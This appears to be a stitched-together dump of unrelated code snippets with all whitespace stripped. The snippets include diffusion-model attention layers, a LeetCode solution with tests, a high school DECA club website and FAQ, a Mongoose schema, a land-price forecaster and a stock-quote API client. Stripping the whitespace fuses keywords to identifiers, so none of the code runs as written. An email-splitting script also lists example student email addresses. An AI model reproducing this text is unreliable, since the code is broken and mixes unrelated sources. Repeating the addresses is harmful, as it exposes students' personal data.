,handler=handler)self.append(main_datapipe)#self.append(dataset2samples(handler=handler))defdecode(self,*args,pre=None,post=None,only=None,partial=False,passthrough_keys=None,handler=wds.reraise_exception,):handlers=[wds.autodecode.ImageHandler(x)ifisinstance(x,str)elsexforxinargs]decoder=KeyPassThroughDecoder(handlers,passthrough_keys=passthrough_keys,pre=pre,post=post,only=only,partial=partial,)returnself.map(decoder,handler=handler)document.getElementById('submit-button').addEventListener('click',()=>{constpoints=getPoints();constcircles=getCircles();constpointsTrace=getPointsTrace(points);constcirclesLayout=getCirclesLayout(circles);Plotly.newPlot('chart',[pointsTrace],circlesLayout);constscore=computeScore(circles,points);document.getElementById('score-heading').innerText=`Score:${score}`;});Plotly.newPlot('chart',[]);importunittestclassSolution:defarray(self,nums:list[int])->int:ifnot(nums):return0lower,upper=min(nums),max(nums)foriinrange(len(nums)):nums[i]-=lowervalues=[False]*(upper-lower+1)forninnums:values[n]=Truelongest=-1count=0forexistinvalues:if(exist):count+=1if(count>longest):longest=countelse:count=0returnlongestdeflongestConsecutive(self,nums:list[int])->int:ifnot(nums):return0nums=set(nums)starts=set()forninnums:if(n-1notinnums):starts.add(n)longest=-1forstartinstarts:count=1while(start+countinnums):count+=1if(count>longest):longest=countreturnlongestclassTestSolution(unittest.TestCase):defsetUp(self)->None:self.solution=Solution()deftest_longestConsecutive(self):self.assertEqual(self.solution.longestConsecutive([100,4,200,1,3,2]),4)self.assertEqual(self.solution.longestConsecutive([0,3,7,2,5,8,4,6,0,1]),9)unittest.main()//jest-domaddscustomjestmatchersforassertingonDOMnodes.//allowsyoutodothingslike://expect(element).toHaveTextContent(/react/i)//learnmore:https://github.com/testing-library/jest-domimport'@testing-library/jest-dom';fromdiffusersimportDiffusionPipelinefromPILimportImagepipeline=DiffusionPipeline.from_pretrained('stabilityai/stable-video-diffusion-img2vid-xt')image=Image.open('still.png')video=pipeline(image)#percentofkeynounsfrompromptinessaydefkeyWords(keyWords,essay):importnltkis_noun=lambdapos:pos[:2]=='NN'tokenized=nltk.word_tokenize(keyWords)nouns=[wordfor(word,pos)innltk.pos_tag(tokenized)ifis_noun(pos)]count=0foriinnouns:count+=list(essay).count(i.lower())count+=list(essay).count(i.capitalize())count+=list(essay).count(i.lower()+'s')count+=list(essay).count(i.capitalize()+'s')result=round(((count/len(essay))*100),2)returnresultconstreportWebVitals=onPerfEntry=>{if(onPerfEntry&&onPerfEntryinstanceofFunction){import('web-vitals').then(({getCLS,getFID,getFCP,getLCP,getTTFB})=>{getCLS(onPerfEntry);getFID(onPerfEntry);getFCP(onPerfEntry);getLCP(onPerfEntry);getTTFB(onPerfEntry);});}};exportdefaultreportWebVitals;constmongoose=require('mongoose');constgameSchema=newmongoose.Schema({user:{type:mongoose.Schema.Types.ObjectId,required:true,ref:'User',},pgn:{type:String,required:true,}});module.exports=mongoose.model('Game',gameSchema);importosimportcv2ascvimportnumpyasnpfrompathlibimportPathdefsmart_search(folder_path:Path,query:str):images=[]net=cv.dnn.readNet('faster_rcnn_resnet50_coco.pb','faster_rcnn_resnet50_coco.pbtxt')#importos#importcv2#importnumpyasnp#defsmart_search(folder_path:str,query:str):#matching_images=[]##Loadthepre-trainedFasterR-CNNmodelwithResNetbackbone#net=cv2.dnn.readNet("faster_rcnn_resnet50_coco.pb","faster_rcnn_resnet50_coco.pbtxt")##Iteratethroughallfilesinthefolder#forroot,dirs,filesinos.walk(folder_path):#forfileinfiles:#file_path=os.path.join(root,file)##Readtheimage#image=cv2.imread(file_path)##Createablobfromtheimageandpassittothenetwork#blob=cv2.dnn.blobFromImage(image,swapRB=True,crop=False)#net.setInput(blob)##Runforwardpass#detections=net.forward()##Iteratethroughthedetections#fordetectionindetections[0,0,:,:]:#confidence=detection[2]##Checkiftheconfidenceisaboveathreshold(adjustasneeded)#ifconfidence>0.5:#class_id=int(detection[1])#class_name=f"Class{class_id}"#Youcanassignanylabelhere##Checkifthequerymatchesthedetectedclassordescription#ifquery.lower()inclass_name.lower():#matching_images.append(file_path)#returnmatching_imagesfromclient_goalsimportfive_year_annual_growth_rateimportpandasaspdimportpicklefromdatetimeimportdatetimefromdateutil.relativedeltaimportrelativedeltawithopen('models/model.pkl','rb')asf:model=pickle.load(f)withopen('data/miami_home_values.csv')asf:df=pd.read_csv(f)defforecast_land_price(price:float,today:datetime,years:int,model=model)->float:x1,x2=df.iloc[(df['ordinal']-today.toordinal()).abs().argsort()[:2]]['ordinal'].valuesy1,y2=df[df['ordinal']==x1]['price'].values[0],df[df['ordinal']==x2]['price'].values[0]current_price_index=(y2-y1)/(x2-x1)*(today.toordinal()-x1)+y1future_date=(today+relativedelta(years=years)).toordinal()future_price_index=model.params['date']*future_date+model.params['const']print(forecast_land_price(2e6,datetime.now(),15))importloggingimportmathfrominspectimportisfunctionfromtypingimportAny,Optionalimporttorchimporttorch.nn.functionalasFfromeinopsimportrearrange,repeatfrompackagingimportversionfromtorchimportnnfromtorch.utils.checkpointimportcheckpointlogpy=logging.getLogger(__name__)ifversion.parse(torch.__version__)>=version.parse("2.0.0"):SDP_IS_AVAILABLE=Truefromtorch.backends.cudaimportSDPBackend,sdp_kernelBACKEND_MAP={SDPBackend.MATH:{"enable_math":True,"enable_flash":False,"enable_mem_efficient":False,},SDPBackend.FLASH_ATTENTION:{"enable_math":False,"enable_flash":True,"enable_mem_efficient":False,},SDPBackend.EFFICIENT_ATTENTION:{"enable_math":False,"enable_flash":False,"enable_mem_efficient":True,},None:{"enable_math":True,"enable_flash":True,"enable_mem_efficient":True},}else:fromcontextlibimportnullcontextSDP_IS_AVAILABLE=Falsesdp_kernel=nullcontextBACKEND_MAP={}logpy.warn(f"NoSDPbackendavailable,likelybecauseyouarerunninginpytorch"f"versions<2.0.Infact,youareusingPyTorch{torch.__version__}."f"Youmightwanttoconsiderupgrading.")try:importxformersimportxformers.opsXFORMERS_IS_AVAILABLE=Trueexcept:XFORMERS_IS_AVAILABLE=Falselogpy.warn("nomodule'xformers'.Processingwithout...")#from.diffusionmodules.utilimportmixed_checkpointascheckpointdefexists(val):returnvalisnotNonedefuniq(arr):return{el:Trueforelinarr}.keys()defdefault(val,d):ifexists(val):returnvalreturnd()ifisfunction(d)elseddefmax_neg_value(t):return-torch.finfo(t.dtype).maxdefinit_(tensor):dim=tensor.shape[-1]std=1/math.sqrt(dim)tensor.uniform_(-std,std)returntensor#feedforwardclassGEGLU(nn.Module):def__init__(self,dim_in,dim_out):super().__init__()self.proj=nn.Linear(dim_in,dim_out*2)defforward(self,x):x,gate=self.proj(x).chunk(2,dim=-1)returnx*F.gelu(gate)classFeedForward(nn.Module):def__init__(self,dim,dim_out=None,mult=4,glu=False,dropout=0.0):super().__init__()inner_dim=int(dim*mult)dim_out=default(dim_out,dim)project_in=(nn.Sequential(nn.Linear(dim,inner_dim),nn.GELU())ifnotgluelseGEGLU(dim,inner_dim))self.net=nn.Sequential(project_in,nn.Dropout(dropout),nn.Linear(inner_dim,dim_out))defforward(self,x):returnself.net(x)defzero_module(module):"""Zeroouttheparametersofamoduleandreturnit."""forpinmodule.parameters():p.detach().zero_()returnmoduledefNormalize(in_channels):returntorch.nn.GroupNorm(num_groups=32,num_channels=in_channels,eps=1e-6,affine=True)classLinearAttention(nn.Module):def__init__(self,dim,heads=4,dim_head=32):super().__init__()self.heads=headshidden_dim=dim_head*headsself.to_qkv=nn.Conv2d(dim,hidden_dim*3,1,bias=False)self.to_out=nn.Conv2d(hidden_dim,dim,1)defforward(self,x):b,c,h,w=x.shapeqkv=self.to_qkv(x)q,k,v=rearrange(qkv,"b(qkvheadsc)hw->qkvbheadsc(hw)",heads=self.heads,qkv=3)k=k.softmax(dim=-1)context=torch.einsum("bhdn,bhen->bhde",k,v)out=torch.einsum("bhde,bhdn->bhen",context,q)out=rearrange(out,"bheadsc(hw)->b(headsc)hw",heads=self.heads,h=h,w=w)returnself.to_out(out)classSelfAttention(nn.Module):ATTENTION_MODES=("xformers","torch","math")def__init__(self,dim:int,num_heads:int=8,qkv_bias:bool=False,qk_scale:Optional[float]=None,attn_drop:float=0.0,proj_drop:float=0.0,attn_mode:str="xformers",):super().__init__()self.num_heads=num_headshead_dim=dim//num_headsself.scale=qk_scaleorhead_dim**-0.5self.qkv=nn.Linear(dim,dim*3,bias=qkv_bias)self.attn_drop=nn.Dropout(attn_drop)self.proj=nn.Linear(dim,dim)self.proj_drop=nn.Dropout(proj_drop)assertattn_modeinself.ATTENTION_MODESself.attn_mode=attn_modedefforward(self,x:torch.Tensor)->torch.Tensor:B,L,C=x.shapeqkv=self.qkv(x)ifself.attn_mode=="torch":qkv=rearrange(qkv,"BL(KHD)->KBHLD",K=3,H=self.num_heads).float()q,k,v=qkv[0],qkv[1],qkv[2]#BHLDx=torch.nn.functional.scaled_dot_product_attention(q,k,v)x=rearrange(x,"BHLD->BL(HD)")elifself.attn_mode=="xformers":qkv=rearrange(qkv,"BL(KHD)->KBLHD",K=3,H=self.num_heads)q,k,v=qkv[0],qkv[1],qkv[2]#BLHDx=xformers.ops.memory_efficient_attention(q,k,v)x=rearrange(x,"BLHD->BL(HD)",H=self.num_heads)elifself.attn_mode=="math":qkv=rearrange(qkv,"BL(KHD)->KBHLD",K=3,H=self.num_heads)q,k,v=qkv[0],qkv[1],qkv[2]#BHLDattn=(q@k.transpose(-2,-1))*self.scaleattn=attn.softmax(dim=-1)attn=self.attn_drop(attn)x=(attn@v).transpose(1,2).reshape(B,L,C)else:raiseNotImplementedx=self.proj(x)x=self.proj_drop(x)returnxclassSpatialSelfAttention(nn.Module):def__init__(self,in_channels):super().__init__()self.in_channels=in_channelsself.norm=Normalize(in_channels)self.q=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)self.k=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)self.v=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)self.proj_out=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)defforward(self,x):h_=xh_=self.norm(h_)q=self.q(h_)k=self.k(h_)v=self.v(h_)#computeattentionb,c,h,w=q.shapeq=rearrange(q,"bchw->b(hw)c")k=rearrange(k,"bchw->bc(hw)")w_=torch.einsum("bij,bjk->bik",q,k)w_=w_*(int(c)**(-0.5))w_=torch.nn.functional.softmax(w_,dim=2)#attendtovaluesv=rearrange(v,"bchw->bc(hw)")w_=rearrange(w_,"bij->bji")h_=torch.einsum("bij,bjk->bik",v,w_)h_=rearrange(h_,"bc(hw)->bchw",h=h)h_=self.proj_out(h_)returnx+h_classCrossAttention(nn.Module):def__init__(self,query_dim,context_dim=None,heads=8,dim_head=64,dropout=0.0,backend=None,):super().__init__()inner_dim=dim_head*headscontext_dim=default(context_dim,query_dim)self.scale=dim_head**-0.5self.heads=headsself.to_q=nn.Linear(query_dim,inner_dim,bias=False)self.to_k=nn.Linear(context_dim,inner_dim,bias=False)self.to_v=nn.Linear(context_dim,inner_dim,bias=False)self.to_out=nn.Sequential(nn.Linear(inner_dim,query_dim),nn.Dropout(dropout))self.backend=backenddefforward(self,x,context=None,mask=None,additional_tokens=None,n_times_crossframe_attn_in_self=0,):h=self.headsifadditional_tokensisnotNone:#getthenumberofmaskedtokensatthebeginningoftheoutputsequencen_tokens_to_mask=additional_tokens.shape[1]#addadditionaltokenx=torch.cat([additional_tokens,x],dim=1)q=self.to_q(x)context=default(context,x)k=self.to_k(context)v=self.to_v(context)ifn_times_crossframe_attn_in_self:#reprogrammingcross-frameattentionasinhttps://arxiv.org/abs/2303.13439assertx.shape[0]%n_times_crossframe_attn_in_self==0n_cp=x.shape[0]//n_times_crossframe_attn_in_selfk=repeat(k[::n_times_crossframe_attn_in_self],"b...->(bn)...",n=n_cp)v=repeat(v[::n_times_crossframe_attn_in_self],"b...->(bn)...",n=n_cp)q,k,v=map(lambdat:rearrange(t,"bn(hd)->bhnd",h=h),(q,k,v))##old"""sim=einsum('bid,bjd->bij',q,k)*self.scaledelq,kifexists(mask):mask=rearrange(mask,'b...->b(...)')max_neg_value=-torch.finfo(sim.dtype).maxmask=repeat(mask,'bj->(bh)()j',h=h)sim.masked_fill_(~mask,max_neg_value)#attention,whatwecannotgetenoughofsim=sim.softmax(dim=-1)out=einsum('bij,bjd->bid',sim,v)"""##newwithsdp_kernel(**BACKEND_MAP[self.backend]):#print("dispatchingintobackend",self.backend,"q/k/vshape:",q.shape,k.shape,v.shape)out=F.scaled_dot_product_attention(q,k,v,attn_mask=mask)#scaleisdim_head**-0.5perdefaultdelq,k,vout=rearrange(out,"bhnd->bn(hd)",h=h)ifadditional_tokensisnotNone:#removeadditionaltokenout=out[:,n_tokens_to_mask:]returnself.to_out(out)classMemoryEfficientCrossAttention(nn.Module):#https://github.com/MatthieuTPHR/diffusers/blob/d80b531ff8060ec1ea982b65a1b8df70f73aa67c/src/diffusers/models/attention.py#L223def__init__(self,query_dim,context_dim=None,heads=8,dim_head=64,dropout=0.0,**kwargs):super().__init__()logpy.debug(f"Settingup{self.__class__.__name__}.Querydimis{query_dim},"f"context_dimis{context_dim}andusing{heads}headswitha"f"dimensionof{dim_head}.")inner_dim=dim_head*headscontext_dim=default(context_dim,query_dim)self.heads=headsself.dim_head=dim_headself.to_q=nn.Linear(query_dim,inner_dim,bias=False)self.to_k=nn.Linear(context_dim,inner_dim,bias=False)self.to_v=nn.Linear(context_dim,inner_dim,bias=False)self.to_out=nn.Sequential(nn.Linear(inner_dim,query_dim),nn.Dropout(dropout))self.attention_op:Optional[Any]=Nonedefforward(self,x,context=None,mask=None,additional_tokens=None,n_times_crossframe_attn_in_self=0,):ifadditional_tokensisnotNone:#getthenumberofmaskedtokensatthebeginningoftheoutputsequencen_tokens_to_mask=additional_tokens.shape[1]#addadditionaltokenx=torch.cat([additional_tokens,x],dim=1)q=self.to_q(x)context=default(context,x)k=self.to_k(context)v=self.to_v(context)ifn_times_crossframe_attn_in_self:#reprogrammingcross-frameattentionasinhttps://arxiv.org/abs/2303.13439assertx.shape[0]%n_times_crossframe_attn_in_self==0#n_cp=x.shape[0]//n_times_crossframe_attn_in_selfk=repeat(k[::n_times_crossframe_attn_in_self],"b...->(bn)...",n=n_times_crossframe_attn_in_self,)v=repeat(v[::n_times_crossframe_attn_in_self],"b...->(bn)...",n=n_times_crossframe_attn_in_self,)b,_,_=q.shapeq,k,v=map(lambdat:t.unsqueeze(3).reshape(b,t.shape[1],self.heads,self.dim_head).permute(0,2,1,3).reshape(b*self.heads,t.shape[1],self.dim_head).contiguous(),(q,k,v),)#actuallycomputetheattention,whatwecannotgetenoughofifversion.parse(xformers.__version__)>=version.parse("0.0.21"):#NOTE:workaroundfor#https://github.com/facebookresearch/xformers/issues/845max_bs=32768N=q.shape[0]n_batches=math.ceil(N/max_bs)out=list()fori_batchinrange(n_batches):batch=slice(i_batch*max_bs,(i_batch+1)*max_bs)out.append(xformers.ops.memory_efficient_attention(q[batch],k[batch],v[batch],attn_bias=None,op=self.attention_op,))out=torch.cat(out,0)else:out=xformers.ops.memory_efficient_attention(q,k,v,attn_bias=None,op=self.attention_op)#TODO:Usethisdirectlyintheattentionoperation,asabiasifexists(mask):raiseNotImplementedErrorout=(out.unsqueeze(0).reshape(b,self.heads,out.shape[1],self.dim_head).permute(0,2,1,3).reshape(b,out.shape[1],self.heads*self.dim_head))ifadditional_tokensisnotNone:#removeadditionaltokenout=out[:,n_tokens_to_mask:]returnself.to_out(out)classBasicTransformerBlock(nn.Module):ATTENTION_MODES={"softmax":CrossAttention,#vanillaattention"softmax-xformers":MemoryEfficientCrossAttention,#ampere}def__init__(self,dim,n_heads,d_head,dropout=0.0,context_dim=None,gated_ff=True,checkpoint=True,disable_self_attn=False,attn_mode="softmax",sdp_backend=None,):super().__init__()assertattn_modeinself.ATTENTION_MODESifattn_mode!="softmax"andnotXFORMERS_IS_AVAILABLE:logpy.warn(f"Attentionmode'{attn_mode}'isnotavailable.Falling"f"backtonativeattention.Thisisnotaproblemin"f"Pytorch>=2.0.FYI,youarerunningwithPyTorch"f"version{torch.__version__}.")attn_mode="softmax"elifattn_mode=="softmax"andnotSDP_IS_AVAILABLE:logpy.warn("Wedonotsupportvanillaattentionanymore,asitistoo""expensive.Sorry.")ifnotXFORMERS_IS_AVAILABLE:assert(False),"Pleaseinstallxformersviae.g.'pipinstallxformers==0.0.16'"else:logpy.info("Fallingbacktoxformersefficientattention.")attn_mode="softmax-xformers"attn_cls=self.ATTENTION_MODES[attn_mode]ifversion.parse(torch.__version__)>=version.parse("2.0.0"):assertsdp_backendisNoneorisinstance(sdp_backend,SDPBackend)else:assertsdp_backendisNoneself.disable_self_attn=disable_self_attnself.attn1=attn_cls(query_dim=dim,heads=n_heads,dim_head=d_head,dropout=dropout,context_dim=context_dimifself.disable_self_attnelseNone,backend=sdp_backend,)#isaself-attentionifnotself.disable_self_attnself.ff=FeedForward(dim,dropout=dropout,glu=gated_ff)self.attn2=attn_cls(query_dim=dim,context_dim=context_dim,heads=n_heads,dim_head=d_head,dropout=dropout,backend=sdp_backend,)#isself-attnifcontextisnoneself.norm1=nn.LayerNorm(dim)self.norm2=nn.LayerNorm(dim)self.norm3=nn.LayerNorm(dim)self.checkpoint=checkpointifself.checkpoint:logpy.debug(f"{self.__class__.__name__}isusingcheckpointing")defforward(self,x,context=None,additional_tokens=None,n_times_crossframe_attn_in_self=0):kwargs={"x":x}ifcontextisnotNone:kwargs.update({"context":context})ifadditional_tokensisnotNone:kwargs.update({"additional_tokens":additional_tokens})ifn_times_crossframe_attn_in_self:kwargs.update({"n_times_crossframe_attn_in_self":n_times_crossframe_attn_in_self})#returnmixed_checkpoint(self._forward,kwargs,self.parameters(),self.checkpoint)ifself.checkpoint:#inputs={"x":x,"context":context}returncheckpoint(self._forward,x,context)#returncheckpoint(self._forward,inputs,self.parameters(),self.checkpoint)else:returnself._forward(**kwargs)def_forward(self,x,context=None,additional_tokens=None,n_times_crossframe_attn_in_self=0):x=(self.attn1(self.norm1(x),context=contextifself.disable_self_attnelseNone,additional_tokens=additional_tokens,n_times_crossframe_attn_in_self=n_times_crossframe_attn_in_selfifnotself.disable_self_attnelse0,)+x)x=(self.attn2(self.norm2(x),context=context,additional_tokens=additional_tokens)+x)x=self.ff(self.norm3(x))+xreturnxclassBasicTransformerSingleLayerBlock(nn.Module):ATTENTION_MODES={"softmax":CrossAttention,#vanillaattention"softmax-xformers":MemoryEfficientCrossAttention#ontheA100snotquiteasfastastheaboveversion#(todomightdependonhead_dim,check,fallsbacktosemi-optimizedkernelsfordim!=[16,32,64,128])}def__init__(self,dim,n_heads,d_head,dropout=0.0,context_dim=None,gated_ff=True,checkpoint=True,attn_mode="softmax",):super().__init__()assertattn_modeinself.ATTENTION_MODESattn_cls=self.ATTENTION_MODES[attn_mode]self.attn1=attn_cls(query_dim=dim,heads=n_heads,dim_head=d_head,dropout=dropout,context_dim=context_dim,)self.ff=FeedForward(dim,dropout=dropout,glu=gated_ff)self.norm1=nn.LayerNorm(dim)self.norm2=nn.LayerNorm(dim)self.checkpoint=checkpointdefforward(self,x,context=None):#inputs={"x":x,"context":context}#returncheckpoint(self._forward,inputs,self.parameters(),self.checkpoint)returncheckpoint(self._forward,x,context)def_forward(self,x,context=None):x=self.attn1(self.norm1(x),context=context)+xx=self.ff(self.norm2(x))+xreturnxclassSpatialTransformer(nn.Module):"""Transformerblockforimage-likedata.First,projecttheinput(akaembedding)andreshapetob,t,d.Thenapplystandardtransformeraction.Finally,reshapetoimageNEW:use_linearformoreefficiencyinsteadofthe1x1convs"""def__init__(self,in_channels,n_heads,d_head,depth=1,dropout=0.0,context_dim=None,disable_self_attn=False,use_linear=False,attn_type="softmax",use_checkpoint=True,#sdp_backend=SDPBackend.FLASH_ATTENTIONsdp_backend=None,):super().__init__()logpy.debug(f"constructing{self.__class__.__name__}ofdepth{depth}w/"f"{in_channels}channelsand{n_heads}heads.")ifexists(context_dim)andnotisinstance(context_dim,list):context_dim=[context_dim]ifexists(context_dim)andisinstance(context_dim,list):ifdepth!=len(context_dim):logpy.warn(f"{self.__class__.__name__}:Foundcontextdims"f"{context_dim}ofdepth{len(context_dim)},whichdoesnot"f"matchthespecified'depth'of{depth}.Settingcontext_dim"f"to{depth*[context_dim[0]]}now.")#depthdoesnotmatchcontextdims.assertall(map(lambdax:x==context_dim[0],context_dim)),"needhomogenouscontext_dimtomatchdepthautomatically"context_dim=depth*[context_dim[0]]elifcontext_dimisNone:context_dim=[None]*depthself.in_channels=in_channelsinner_dim=n_heads*d_headself.norm=Normalize(in_channels)ifnotuse_linear:self.proj_in=nn.Conv2d(in_channels,inner_dim,kernel_size=1,stride=1,padding=0)else:self.proj_in=nn.Linear(in_channels,inner_dim)self.transformer_blocks=nn.ModuleList([BasicTransformerBlock(inner_dim,n_heads,d_head,dropout=dropout,context_dim=context_dim[d],disable_self_attn=disable_self_attn,attn_mode=attn_type,checkpoint=use_checkpoint,sdp_backend=sdp_backend,)fordinrange(depth)])ifnotuse_linear:self.proj_out=zero_module(nn.Conv2d(inner_dim,in_channels,kernel_size=1,stride=1,padding=0))else:#self.proj_out=zero_module(nn.Linear(in_channels,inner_dim))self.proj_out=zero_module(nn.Linear(inner_dim,in_channels))self.use_linear=use_lineardefforward(self,x,context=None):#note:ifnocontextisgiven,cross-attentiondefaultstoself-attentionifnotisinstance(context,list):context=[context]b,c,h,w=x.shapex_in=xx=self.norm(x)ifnotself.use_linear:x=self.proj_in(x)x=rearrange(x,"bchw->b(hw)c").contiguous()ifself.use_linear:x=self.proj_in(x)fori,blockinenumerate(self.transformer_blocks):ifi>0andlen(context)==1:i=0#usesamecontextforeachblockx=block(x,context=context[i])ifself.use_linear:x=self.proj_out(x)x=rearrange(x,"b(hw)c->bchw",h=h,w=w).contiguous()ifnotself.use_linear:x=self.proj_out(x)returnx+x_inclassSimpleTransformer(nn.Module):def__init__(self,dim:int,depth:int,heads:int,dim_head:int,context_dim:Optional[int]=None,dropout:float=0.0,checkpoint:bool=True,):super().__init__()self.layers=nn.ModuleList([])for_inrange(depth):self.layers.append(BasicTransformerBlock(dim,heads,dim_head,dropout=dropout,context_dim=context_dim,attn_mode="softmax-xformers",checkpoint=checkpoint,))defforward(self,x:torch.Tensor,context:Optional[torch.Tensor]=None,)->torch.Tensor:forlayerinself.layers:x=layer(x,context)returnx//Next.jsAPIroutesupport:https://nextjs.org/docs/api-routes/introductionexportdefaultfunctionhandler(req,res){res.status(200).json({name:'JohnDoe'})}importReactfrom'react';constfaqs=[{question:'WhatisDECAanditsmainobjective?',answer:'DECAisaninternationalassociationofhighschoolandcollegestudentsaimedatpreparingemergingleadersandentrepreneursinmarketing,finance,hospitality,andmanagement.'},{question:'HowcanIjointheDECAclub?',answer:'StudentscanjoinDECAbysigningupduringtheclubrecruitmentperiodatthebeginningoftheacademicyearorcontactingtheclubofficersformoredetails.'},{question:'WhattypesofactivitiesandeventsdoesDECAorganize?',answer:'DECAorganizesavarietyofactivitiesincludingbusinesscompetitions,leadershipconferences,communityserviceprojects,andworkshopswithindustryprofessionals.'},{question:'ArethereanyprerequisitestojoinDECA?',answer:'TherearenospecificprerequisitestojoinDECA.However,akeeninterestinbusiness,entrepreneurship,andleadershipishighlybeneficial.'},{question:'HowdoesDECApreparestudentsforprofessionalcareers?',answer:'DECAprovidespracticalexperiencesthroughcompetitionsandnetworkingevents,helpingstudentsdevelopskillsincommunication,leadership,andbusinessmanagement.'},{question:'WhatareDECAcompetitiveeventslike?',answer:'DECA’scompetitiveeventschallengestudentsinvariousbusinessscenarios,includingroleplays,writtenprojects,andpresentations,judgedbyindustryprofessionals.'},{question:'ArethereleadershipopportunitieswithinDECA?',answer:'Yes,studentscantakeonleadershiprolesatlocal,state,andinternationallevels,gaininginvaluableexperienceinmanagingteams,projects,andevents.'},];exportdefaultfunctionFAQs(){return(<divid="FAQs"className="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10"><h1className="text-4xlfont-boldmb-10text-blue-500">FrequentlyAskedQuestions</h1>{faqs.map((faq,index)=>(<divkey={index}className="mb-6"><h2className="text-xlfont-semiboldmb-2">{faq.question}</h2><pclassName="text-mdtext-gray-700">{faq.answer}</p></div>))}</div>);}importstreamlitasstfromtimeimportsleepfromrandomimportrandoma=st.header('')while(True):a.header(random())sleep(1)importlocalFontfrom'next/font/local';import'./globals.css';constgeistSans=localFont({src:'./fonts/GeistVF.woff',variable:'--font-geist-sans',weight:'100900',});constgeistMono=localFont({src:'./fonts/GeistMonoVF.woff',variable:'--font-geist-mono',weight:'100900',});exportconstmetadata={title:'CreateNextApp',description:'Generatedbycreatenextapp',};exportdefaultfunctionRootLayout({children}){return(<htmllang='en'><bodyclassName={`${geistSans.variable}${geistMono.variable}antialiased`}>{children}</body></html>);}importpandasaspddf=pd.read_csv('emails.csv')#getallemailsthatendin4numberssuchasguillena5888@my.sduhsd.netdf=df[df['Email'].str.split('@').str[0].str.contains(r'\d{4}$')]#writethelistofemailstofilesthatarenomorethan500count#onlyincludetheemailcolumn#noheaders#example'''zanerz4995@my.sduhsd.netzumbroz7483@my.sduhsd.netchenz3050@my.sduhsd.net'''foriinrange(0,len(df),500):df[i:i+500]['Email'].to_csv(f'split/emails_{i//500}.txt',index=False,header=False)constCIRCLE=50;constPOINT=1;constRADIUS_DEGREE=3;classCircle{constructor(x,y,r){this.x=x;this.y=y;this.r=r;}toString(){return`(${this.x},${this.y})|${this.r}`;}contains(point){constx=point[0];consty=point[1];return(x-this.x)**2+(y-this.y)**2<=this.r**2;}cost(){returnthis.r**RADIUS_DEGREE+CIRCLE;}}constvalid_point=(point,circles)=>{for(constcircleofcircles){if(circle.contains(point)){returntrue;}}returnfalse;}constcomputeScore=(circles,points)=>{circles=circles.map((circle)=>{returnnewCircle(circle[0],circle[1],circle[2]);});lettotal=0;for(constpointofpoints){if(valid_point(point,circles)){total+=POINT;}}for(constcircleofcircles){total-=circle.cost();}returntotal;}import{createApi,fetchBaseQuery}from'@reduxjs/toolkit/query/react';exportconstapiSlice=createApi({baseQuery:fetchBaseQuery({baseUrl:'http://localhost:3500'}),endpoints:(builder)=>({}),});ingredients="""FLINGBERKSHREPORKWATERGANESECHIVESSHAOKINGWINESOYSAUCEWATERSOYBEANSWHEATSALTSESAMEOL,SUGARGAGER,GARLIC,GELATNEKOSHERSALT,Spices,carrots,onion,celery,DOUGH.WRAPPER:UNBLEACHEDWHEATFLOUR,WATERPOTATOSTARCH,KOSHERSALT,OLiVEOIL,LYEWATER."""importpyperclipdefclean(string:str)->str:returnstring.replace('\n','').lower().strip().rstrip('.')pyperclip.copy(clean(ingredients))importImagefrom"next/image";importNavbarfrom"../components/Navbar";importHerofrom"@/components/Hero";importAboutfrom"@/components/About";import{Inter}from"next/font/google";importHeadfrom"next/head";importCalendarfrom"@/components/Calendar";importTeamfrom"@/components/Team";importFaqfrom"@/components/Faq";importFooterfrom"@/components/Footer";constinter=Inter({subsets:["latin"]});exportdefaultfunctionHome(){return(<main><Head><title>CanyonCrestAcademyDECA</title><metaname="description"content="JoinDECAtoexploretherealmsofmarketing,finance,hospitality,andmanagementwhiledevelopingleadershipandentrepreneurialskills."key="desc"/><metaproperty="og:title"content="CCADECA:EmpoweringEmergingLeadersandEntrepreneurs"/><metaproperty="og:description"content="CCADECApreparesthenextgenerationofleadersandinnovators,offeringstudentsuniqueopportunitiestogrowthroughcompetitions,conferences,andnetworking."/><metaproperty="og:image"content="/DECA-Diamond-1.png"/></Head><Navbar/><Hero/><About/><Calendar/><Team/><Faq/><Footer/></main>);}importjsonimportloggingfromlogging.handlersimportRotatingFileHandler#loggersettingslogger=logging.getLogger('my_logger')logger.setLevel(logging.DEBUG)handler=RotatingFileHandler("python_client.log",maxBytes=5*1024*1024,backupCount=3)FORMAT="%(asctime)-15s%(message)s"fmt=logging.Formatter(FORMAT,datefmt='%m/%d/%Y%I:%M:%S%p')handler.setFormatter(fmt)logger.addHandler(handler)classMarket:def__init__(self,session,base_url):self.session=sessionself.base_url=base_urldefquotes(self):"""CallsquotesAPItoprovidequotedetailsforequities,options,andmutualfunds:paramself:Passesauthenticatedsessioninparameter"""symbols=input("\nPleaseenterStockSymbol:")#URLfortheAPIendpointurl=self.base_url+"/v1/market/quote/"+symbols+".json"#MakeAPIcallforGETrequestresponse=self.session.get(url)logger.debug("RequestHeader:%s",response.request.headers)ifresponseisnotNoneandresponse.status_code==200:parsed=json.loads(response.text)logger.debug("ResponseBody:%s",json.dumps(parsed,indent=4,sort_keys=True))#Handleandparseresponseprint("")data=response.json()ifdataisnotNoneand"QuoteResponse"indataand"QuoteData"indata["QuoteResponse"]:forquoteindata["QuoteResponse"]["QuoteData"]:ifquoteisnotNoneand"dateTime"inquote:print("DateTime:"+quote["dateTime"])ifquoteisnotNoneand"Product"inquoteand"symbol"inquote["Product"]:print("Symbol:"+quote["Product"]["symbol"])ifquoteisnotNoneand"Product"inquoteand"securityType"inquote["Product"]:print("SecurityType:"+quote["Product"]["securityType"])ifquoteisnotNoneand"All"inquoteand"lastTrade"inquote["All"]:print("LastPrice:"+str(quote["All"]["lastTrade"]))ifquoteisnotNoneand"All"inquoteand"changeClose"inquote["All"]\and"changeClosePercentage"inquote["All"]:print("Today'sChange:"+str('{:,.3f}'.format(quote["All"]["changeClose"]))+"("+str(quote["All"]["changeClosePercentage"])+"%)")ifquoteisnotNoneand"All"inquoteand"lastTrade"inquote["All"]:print("Open:"+str('{:,.2f}'.format(quote["All"]["lastTrade"])))ifquoteisnotNoneand"All"inquoteand"previousClose"inquote["All"]:print("PreviousClose:"+str('{:,.2f}'.format(quote["All"]["previousClose"])))ifquoteisnotNoneand"All"inquoteand"bid"inquote["All"]and"bidS